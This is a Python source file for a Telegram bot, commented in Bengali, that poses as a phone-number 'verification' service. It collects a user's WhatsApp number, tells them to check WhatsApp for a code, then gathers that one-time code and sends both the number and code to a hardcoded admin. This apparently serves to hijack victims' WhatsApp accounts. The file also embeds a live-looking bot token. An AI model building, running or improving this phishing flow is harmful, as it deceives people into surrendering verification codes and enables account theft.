import telebot
from telebot import types
from datetime import datetime
import time
import threading

# 🔥 Bot Token এবং Admin ID
API_TOKEN = '7736826287:AAFiglXIJsDN3JMZagRfY0TCvxIK1n8E06g'
ADMIN_ID = 6243881362  # আপনার অ্যাডমিন আইডি
bot = telebot.TeleBot(API_TOKEN)

users_data = {}  # ইউজার ডাটা সংরক্ষণ
active_sessions = {}  # এক অপশন বাতিল করতে হলে ট্র্যাক করতে হবে

# 🔔 নামাজের সময়সূচি (বট এই সময় বন্ধ থাকবে)
prayer_times = {
    "ফজর": ("04:00", "05:00"),
    "জোহর": ("12:50", "13:50"),
    "আসর": ("16:00", "16:40"),
    "মাগরিব": ("18:00", "18:30"),
    "এশা": ("19:15", "19:45")
}

# 📌 নামাজের সময় চেক করার ফাংশন
def is_prayer_time():
    current_time = datetime.now().strftime("%H:%M")
    for prayer, (start, end) in prayer_times.items():
        if start <= current_time <= end:
            return prayer
    return None

# 🎉 স্টার্ট মেসেজ (এক্সক্লুসিভ ডিজাইন)
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    prayer_in_progress = is_prayer_time()
    
    if prayer_in_progress:
        bot.send_message(user_id, f"⏳ **বট এখন {prayer_in_progress} নামাজের জন্য বন্ধ আছে।**\n\n📢 দয়া করে কিছুক্ষণ পর চেষ্টা করুন!", parse_mode="Markdown")
        return

    welcome_text = f"""
✨ **স্বাগতম {message.from_user.first_name}!** ✨
🛠️ এই বটের মাধ্যমে আপনি সহজেই **OTP ভেরিফিকেশন** ও অন্যান্য সুবিধা পেতে পারেন।

📌 **নিচের অপশন থেকে একটি বেছে নিন:** 👇
"""
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("📱 Number Verification", "📞 Support")
    bot.send_message(user_id, welcome_text, reply_markup=markup, parse_mode="Markdown")

# 📱 Number Verification
@bot.message_handler(func=lambda message: message.text == "📱 Number Verification")
def get_number(message):
    user_id = message.chat.id
    if user_id in active_sessions:
        bot.send_message(user_id, "⚠️ **আপনার আগের অনুরোধ বাতিল করা হয়েছে। নতুন অনুরোধ দিন!**", parse_mode="Markdown")
    
    active_sessions[user_id] = "number_verification"
    bot.send_message(user_id, "✅ **আপনার WhatsApp নাম্বার দিন:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, ask_otp)

def ask_otp(message):
    user_id = message.chat.id
    if active_sessions.get(user_id) != "number_verification":
        return
    
    number = message.text
    users_data[user_id] = {'number': number}

    # অ্যাডমিনকে জানানো হবে
    bot.send_message(ADMIN_ID, f"📩 **নতুন নাম্বার প্রাপ্ত!**\n🆔 **User ID:** `{user_id}`\n📞 **Number:** `{number}`", parse_mode="Markdown")

    bot.send_message(user_id, "📩 **Check Your WhatsApp To Get OTP Code!**", parse_mode="Markdown")

    # ⏳ ৪০ সেকেন্ডের কাউন্টডাউন
    countdown_message = bot.send_message(user_id, "⏳ **OTP এর জন্য অপেক্ষা করুন: 40 সেকেন্ড**", parse_mode="Markdown")
    
    def countdown():
        for i in range(40, 0, -1):
            if active_sessions.get(user_id) != "number_verification":
                return
            time.sleep(1)
            bot.edit_message_text(chat_id=user_id, message_id=countdown_message.message_id, text=f"⏳ **OTP এর জন্য অপেক্ষা করুন: {i} সেকেন্ড**", parse_mode="Markdown")

        bot.send_message(user_id, "🔢 **এখন OTP কোড দিন:**", parse_mode="Markdown")
        bot.register_next_step_handler(message, verify_otp, number)

    threading.Thread(target=countdown).start()

def verify_otp(message, number):
    user_id = message.chat.id
    if active_sessions.get(user_id) != "number_verification":
        return

    otp = message.text
    users_data[user_id]['otp'] = otp  

    bot.send_message(user_id, "⏳ **We Are Checking, Please Wait...**", parse_mode="Markdown")

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Verified 💚", callback_data=f"verify_{user_id}"),
               types.InlineKeyboardButton("❌ Unverified ❤️", callback_data=f"unverify_{user_id}"))

    bot.send_message(ADMIN_ID, f"📥 **নতুন OTP অনুরোধ!**\n\n🆔 **User ID:** `{user_id}`\n📞 **Number:** `{number}`\n🔢 **OTP:** `{otp}`",
                     reply_markup=markup, parse_mode="Markdown")

# ✅ অ্যাডমিনের বোতাম হ্যান্ডলার
@bot.callback_query_handler(func=lambda call: call.data.startswith("verify_") or call.data.startswith("unverify_"))
def handle_verification(call):
    user_id = int(call.data.split("_")[1])

    if call.data.startswith("verify_"):
        bot.send_message(user_id, "✅ **Your OTP has been Verified!** 🎉", parse_mode="Markdown")
        bot.send_message(ADMIN_ID, f"✅ **User ID {user_id} ভেরিফাইড হয়েছে!** 💚", parse_mode="Markdown")
    else:
        bot.send_message(user_id, "❌ **Your OTP Verification Failed!** Try Again.", parse_mode="Markdown")
        bot.send_message(ADMIN_ID, f"❌ **User ID {user_id} আনভেরিফাইড করা হয়েছে!** ❤️", parse_mode="Markdown")

    active_sessions.pop(user_id, None)  # অপশন শেষ হলে সেশন বন্ধ

# 📞 Support অপশন
@bot.message_handler(func=lambda message: message.text == "📞 Support")
def support(message):
    bot.send_message(message.chat.id, "📩 **সহায়তার জন্য এখানে যোগাযোগ করুন:** [Support](https://t.me/YOUR_SUPPORT_LINK)", parse_mode="Markdown")

# 🚀 বট চালু করুন
bot.polling(none_stop=True)
